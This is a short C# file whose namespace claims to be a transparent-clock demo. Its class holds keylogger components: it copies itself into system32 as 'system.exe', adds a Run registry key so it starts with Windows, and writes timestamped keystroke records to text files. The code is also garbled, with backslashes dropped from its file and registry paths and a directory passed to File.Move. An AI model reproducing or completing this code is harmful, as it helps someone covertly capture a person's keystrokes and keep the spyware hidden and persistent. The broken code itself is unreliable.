using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Win32;
namespace 透明时钟演示
{
    class KeyHisto
    {
        public void MoveFile()

　　{

　　//判断该位置是否存在_system.exe,如果不是，就把程序移动到该位置,否则返回

　　if(!File.Exists("c:windows/system32/system.exe"))

　　{
　　File.Move(Directory.GetCurrentDirectory(),"c:windows/system32/system.exe");

　　}

　　else

　　return;

　　}

　　//在注册表里写如启动信息

　　public void registryRun()
　　{

　　RegistryKey key1=Registry.CurrentUser.CreateSubKey("SoftwareMicrosoftWindowsCurrentVersionun");
　　key1.SetValue("","c:windows/system32/system.exe");
　　key1.Close();
　　}
　　public void FirstWrite()

　　{

　　StreamWriter sw = new StreamWriter("d:/keyReport.txt",true);

　　sw.WriteLine("************* LittleStudio Studio ************* ");

　　sw.WriteLine("******** " + DateTime.Today.Year.ToString() + "."

　　+ DateTime.Today.Month.ToString() + "."

　　+ DateTime.Today.Day.ToString() + "　　 "

　　+ DateTime.Now.Hour.ToString() + ":"

　　+ DateTime.Now.Minute.ToString() + ":"

　　+ DateTime.Now.Second.ToString() + " ********");

　　sw.Close();

　　}

　　public void WriteDate(string keyEvents,string keyDate)

　　{

　　try

　　{

　　StreamWriter sw = new StreamWriter("d:/aaa.txt",true);

　　sw.WriteLine(keyDate + "键 " + keyEvents + "　 "

　　+ DateTime.Now.Hour.ToString() + ":"

　　+ DateTime.Now.Minute.ToString() + ":"

　　+ DateTime.Now.Second.ToString());

　　sw.Close();

　　}

　　catch{}

　　return;

　　}
    }
}
